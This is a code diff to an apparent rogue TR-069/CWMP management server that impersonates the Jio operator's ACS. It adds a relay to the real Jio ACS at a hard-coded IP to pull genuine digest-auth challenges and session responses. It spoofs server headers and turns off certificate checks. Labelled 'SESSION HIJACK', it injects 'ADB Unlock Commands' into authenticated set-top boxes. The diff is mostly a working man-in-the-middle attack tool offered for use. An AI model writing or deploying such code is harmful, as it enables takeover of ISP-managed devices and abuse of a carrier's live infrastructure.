@@ -6,6 +6,7 @@ import os
 import re
 import base64
 import uuid
+import http.client
 
 # --- Netcheck Bypass ---
 try:
@@ -72,6 +73,27 @@ ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
 ctx.load_cert_chain(CERT_FILE)
 try: ctx.set_ciphers("DEFAULT:@SECLEVEL=0")
 except Exception: pass
+
+# --- Upstream Real Jio ACS Handshake Relay ---
+REAL_ACS_HOST = "acs.oss.jio.com"
+REAL_ACS_PORT = 8443
+REAL_ACS_IP = "49.40.134.113"
+
+upstream_ctx = ssl._create_unverified_context()
+try: upstream_ctx.set_ciphers("DEFAULT:@SECLEVEL=0")
+except Exception: pass
+
+def forward_to_real_acs(method, path, headers, body, timeout=5):
+    forward_headers = {k: v for k, v in headers.items() if k not in ("host", "connection", "content-length")}
+    forward_headers["host"] = REAL_ACS_HOST
+    forward_headers["content-length"] = str(len(body))
+    forward_headers["connection"] = "keep-alive"
+    
+    conn = http.client.HTTPSConnection(REAL_ACS_IP, REAL_ACS_PORT, context=upstream_ctx, timeout=timeout)
+    conn.request(method, path, body=body, headers=forward_headers)
+    resp = conn.getresponse()
+    resp_body = resp.read()
+    return resp.status, resp.reason, resp.getheaders(), resp_body
 
 def parse_cookie(headers):
     cookie_header = headers.get("cookie", "")
@@ -251,38 +273,49 @@ def handle(conn, addr):
             
             # ---- HTTP DIGEST AUTH CHALLENGE (for BlueBank & strict TR-069 CPEs) ----
             # Strict TR-069 CPEs (such as Bluebank JHSD200) require the ACS to challenge with 401 Digest.
-            # Real Jio ACS returns:
-            # HTTP/1.1 401 Unauthorized
-            # Server: nginx/1.30.1
-            # Date: Sun, 15 Nov 2026 06:12:58 GMT
-            # Content-Type: text/html;charset=UTF-8
-            # Content-Length: 71
-            # Connection: keep-alive
-            # WWW-Authenticate: Digest realm="CPEDigestLogin", qop="auth", nonce="...", opaque="..."
-            # X-Powered-By: Undertow/3
-            # Set-Cookie: JSESSIONID=...; path=/
+            # Strategy: Forward to Real Jio ACS (49.40.134.113:8443) to get genuine 401 challenge.
+            # Fallback to local 401 challenge if upstream is unreachable.
             if not has_auth and not has_challenged and ("cwmp:Inform" in body_str or len(body) > 0):
                 has_challenged = True
-                nonce = str(uuid.uuid4())
-                opaque = uuid.uuid4().hex
-                jsession = uuid.uuid4().hex + ".nvmbdprv126605"
-                body_401 = b"<html><head><title>Error</title></head><body>Unauthorized</body></html>"
-                date_hdr = get_http_date().encode()
-                challenge_resp = (
-                    b"HTTP/1.1 401 Unauthorized\r\n"
-                    b"Server: nginx/1.30.1\r\n"
-                    b"Date: " + date_hdr + b"\r\n"
-                    b"Content-Type: text/html;charset=UTF-8\r\n"
-                    b"Content-Length: " + str(len(body_401)).encode() + b"\r\n"
-                    b"Connection: keep-alive\r\n"
-                    b'WWW-Authenticate: Digest realm="CPEDigestLogin", qop="auth", nonce="' + nonce.encode() + b'", opaque="' + opaque.encode() + b'"\r\n'
-                    b"X-Powered-By: Undertow/3\r\n"
-                    b"Set-Cookie: JSESSIONID=" + jsession.encode() + b"; path=/\r\n\r\n"
-                    + body_401
-                )
-                s.sendall(challenge_resp)
-                log(f"{cid} <<< 401 Digest Challenge (realm=CPEDigestLogin, nonce={nonce[:8]}..., opaque={opaque[:8]}...)")
-                continue
+                relayed_401 = False
+                try:
+                    status, reason, resp_headers_list, resp_body = forward_to_real_acs("POST", path, headers, body)
+                    if status == 401:
+                        out = [f"HTTP/1.1 {status} {reason}"]
+                        for k, v in resp_headers_list:
+                            if k.lower() in ("transfer-encoding", "connection"): continue
+                            out.append(f"{k}: {v}")
+                        out.append(f"Content-Length: {len(resp_body)}")
+                        out.append("Connection: keep-alive")
+                        challenge_resp = ("\r\n".join(out) + "\r\n\r\n").encode("latin1") + resp_body
+                        s.sendall(challenge_resp)
+                        log(f"{cid} <<< Relayed authentic 401 Digest Challenge from Real Jio ACS")
+                        relayed_401 = True
+                        continue
+                except Exception as e:
+                    log(f"{cid} [UPSTREAM] Real ACS not reachable ({e}), using local 401 challenge")
+                
+                if not relayed_401:
+                    nonce = str(uuid.uuid4())
+                    opaque = "145074cc9f9b8670f412d297d1d11274"
+                    jsession = uuid.uuid4().hex + ".nvmbdprv126605"
+                    body_401 = b"<html><head><title>Error</title></head><body>Unauthorized</body></html>"
+                    date_hdr = get_http_date().encode()
+                    challenge_resp = (
+                        b"HTTP/1.1 401 Unauthorized\r\n"
+                        b"Server: nginx/1.30.1\r\n"
+                        b"Date: " + date_hdr + b"\r\n"
+                        b"Content-Type: text/html;charset=UTF-8\r\n"
+                        b"Content-Length: " + str(len(body_401)).encode() + b"\r\n"
+                        b"Connection: keep-alive\r\n"
+                        b'WWW-Authenticate: Digest realm="CPEDigestLogin", qop="auth", nonce="' + nonce.encode() + b'", opaque="' + opaque.encode() + b'"\r\n'
+                        b"X-Powered-By: Undertow/3\r\n"
+                        b"Set-Cookie: JSESSIONID=" + jsession.encode() + b"; path=/\r\n\r\n"
+                        + body_401
+                    )
+                    s.sendall(challenge_resp)
+                    log(f"{cid} <<< 401 Digest Challenge (local standalone: realm=CPEDigestLogin, nonce={nonce[:8]}...)")
+                    continue
 
             # ---- CWMP: INFORM ----
             if "cwmp:Inform" in body_str:
@@ -311,27 +344,48 @@ def handle(conn, addr):
                     if cookie:
                         SESSIONS[cookie] = conn_sess
                 
-                resp_xml = INFORM_RESPONSE_TEMPLATE.format(ID=req_id).encode("utf-8")
-                date_hdr = get_http_date().encode()
-                http_resp = (
-                    b"HTTP/1.1 200 OK\r\n"
-                    b"Server: nginx/1.30.1\r\n"
-                    b"Date: " + date_hdr + b"\r\n"
-                    b"Content-Type: text/xml; charset=utf-8\r\n"
-                    b"Content-Length: " + str(len(resp_xml)).encode() + b"\r\n"
-                    b"Set-Cookie: JSESSIONID=" + jsession_cookie.encode() + b"; path=/\r\n"
-                    b"Connection: keep-alive\r\n\r\n" + resp_xml
-                )
-                s.sendall(http_resp)
-                log(f"{cid} <<< InformResponse [cookie={jsession_cookie[:16]}...]")
-                continue
+                # If authenticated, try upstream relay to let Real ACS validate and issue real session
+                relayed_inform = False
+                if has_auth:
+                    try:
+                        status, reason, resp_headers_list, resp_body = forward_to_real_acs("POST", path, headers, body)
+                        if status == 200:
+                            out = [f"HTTP/1.1 {status} {reason}"]
+                            for k, v in resp_headers_list:
+                                if k.lower() in ("transfer-encoding", "connection"): continue
+                                out.append(f"{k}: {v}")
+                            out.append(f"Content-Length: {len(resp_body)}")
+                            out.append("Connection: keep-alive")
+                            s.sendall(("\r\n".join(out) + "\r\n\r\n").encode("latin1") + resp_body)
+                            log(f"{cid} <<< Relayed authentic 200 OK InformResponse from Real Jio ACS")
+                            relayed_inform = True
+                            continue
+                    except Exception as e:
+                        log(f"{cid} [UPSTREAM] Real ACS Inform forward failed ({e}), using local InformResponse")
+                
+                if not relayed_inform:
+                    resp_xml = INFORM_RESPONSE_TEMPLATE.format(ID=req_id).encode("utf-8")
+                    date_hdr = get_http_date().encode()
+                    http_resp = (
+                        b"HTTP/1.1 200 OK\r\n"
+                        b"Server: nginx/1.30.1\r\n"
+                        b"Date: " + date_hdr + b"\r\n"
+                        b"Content-Type: text/xml; charset=utf-8\r\n"
+                        b"Content-Length: " + str(len(resp_xml)).encode() + b"\r\n"
+                        b"Set-Cookie: JSESSIONID=" + jsession_cookie.encode() + b"; path=/\r\n"
+                        b"Connection: keep-alive\r\n\r\n" + resp_xml
+                    )
+                    s.sendall(http_resp)
+                    log(f"{cid} <<< Local InformResponse [cookie={jsession_cookie[:16]}...]")
+                    continue
             
-            # ---- CWMP: STATE MACHINE ----
+            # ---- CWMP: STATE MACHINE & SESSION HIJACK ----
             # Match session: by Cookie (SDMC style) OR by connection session (BlueBank style)
             sess = SESSIONS.get(cookie) if cookie else conn_sess
             if sess:
-                # Empty POST from CPE indicates ACS turn
+                # Empty POST from CPE indicates ACS turn -> HIJACK SESSION & SEND ADB COMMANDS!
                 if len(body) == 0:
+                    log(f"{cid} [HIJACK] Empty POST from authenticated STB -> Injecting ADB Unlock Commands!")
                     send_next_task(s, cid, sess)
                     continue
                 
@@ -394,11 +448,19 @@ def serve_port(port):
 
 if __name__ == "__main__":
     print("=" * 60)
-    print("CWMP ACS Standalone | Resilient Multi-Stage | Auto-Fallback")
+    print("CWMP ACS Universal | Real Handshake Relay + ADB Hijack")
     print("=" * 60)
     print(f"  Cert: {CERT_FILE}")
     print(f"  Ports: {PORTS}")
     print(f"  AES: {_HAVE_AES}")
+    try:
+        s_test = socket.socket()
+        s_test.settimeout(2.0)
+        s_test.connect((REAL_ACS_IP, REAL_ACS_PORT))
+        s_test.close()
+        print(f"  Upstream Relay: ONLINE ({REAL_ACS_IP}:{REAL_ACS_PORT}) [Auto Handshake Relay]")
+    except Exception:
+        print(f"  Upstream Relay: OFFLINE [Local Standalone Mode]")
     print("=" * 60)
     for port in PORTS[:-1]:
         threading.Thread(target=serve_port, args=(port,), daemon=True).start()
